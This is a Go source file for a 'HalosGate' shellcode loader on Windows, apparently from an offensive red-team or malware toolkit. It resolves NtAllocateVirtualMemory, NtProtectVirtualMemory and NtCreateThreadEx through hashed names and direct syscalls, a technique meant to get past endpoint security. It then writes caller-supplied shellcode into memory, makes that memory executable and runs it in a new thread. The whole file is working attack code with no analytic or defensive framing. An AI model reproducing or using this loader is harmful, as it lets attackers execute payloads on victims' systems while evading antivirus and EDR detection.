package loader

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

const (
	NAM = "NtAllocateVirtualMemory"
	NPM = "NtProtectVirtualMemory"
	NCT = "NtCreateThreadEx"
)

// HalosGate loader
func HalosGate(shellcode []byte) error {
	var thisThread = uintptr(0xffffffffffffffff)

	vNtAllocateVirtualMemory, namErr := gabh.MemHgate(str2sha1(NAM), str2sha1)
	if namErr != nil {
		return fmt.Errorf("vNtAllocateVirtualMemory failed: %w", namErr)
	}

	vNtProtectVirtualMemory, npmErr := gabh.DiskHgate(Sha256Hex(NPM), Sha256Hex)
	if npmErr != nil {
		return fmt.Errorf("vNtProtectVirtualMemory failed: %w", npmErr)
	}

	vCreateThread, nctErr := gabh.MemHgate(Sha256Hex(NCT), Sha256Hex)
	if nctErr != nil {
		return fmt.Errorf("vCreateThread failed: %w", nctErr)
	}

	vWaitForSingleObject, _, vWErr := gabh.DiskFuncPtr(
		"kernel32.dll",
		str2sha1("WaitForSingleObject"),
		str2sha1,
	)
	if vWErr != nil {
		return fmt.Errorf("vWaitForSingleObject failed: %w", vWErr)
	}

	ctErr := createThread(
		shellcode,
		thisThread,
		vNtAllocateVirtualMemory,
		vNtProtectVirtualMemory,
		vCreateThread,
		vWaitForSingleObject,
	)
	if ctErr != nil {
		return ctErr
	}

	return nil
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, vWaitForSingleObject uint64) error {

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, err := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("1 %s %x", err, r1)
	}

	memcpy(baseA, shellcode)

	var oldProtect uintptr
	r1, ntPvmErr := gabh.HgSyscall(
		NtProtectVirtualMemorySysid, // NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ntPvmErr != nil {
		return fmt.Errorf("1 %s %x", ntPvmErr, r1)
	}

	var hhosthread uintptr
	r1, ntCtErr := gabh.HgSyscall(
		NtCreateThreadExSysid,                // NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), // hthread
		0x1FFFFF,                             // desiredaccess
		0,                                    // objattributes
		handle,                               // processhandle
		baseA,                                // lpstartaddress
		0,                                    // lpparam
		uintptr(0),                           // createsuspended
		0,                                    // zerobits
		0,                                    // sizeofstackcommit
		0,                                    // sizeofstackreserve
		0,                                    // lpbytesbuffer
	)
	if ntCtErr != nil {
		return fmt.Errorf("1 %s %x", ntCtErr, r1)
	}

	_, _, sysErr := syscall.SyscallN(uintptr(vWaitForSingleObject), hhosthread, windows.INFINITE, 0)
	if sysErr != 0 {
		return fmt.Errorf("1 %s %x", err, r1)
	}

	return nil
}

/*
func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}*/

func memcpy(dst uintptr, src []byte) error {
	ptr := (*byte)(unsafe.Pointer(dst))
	addr := unsafe.Slice(ptr, len(src))
	copy(addr, src)

	return nil
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
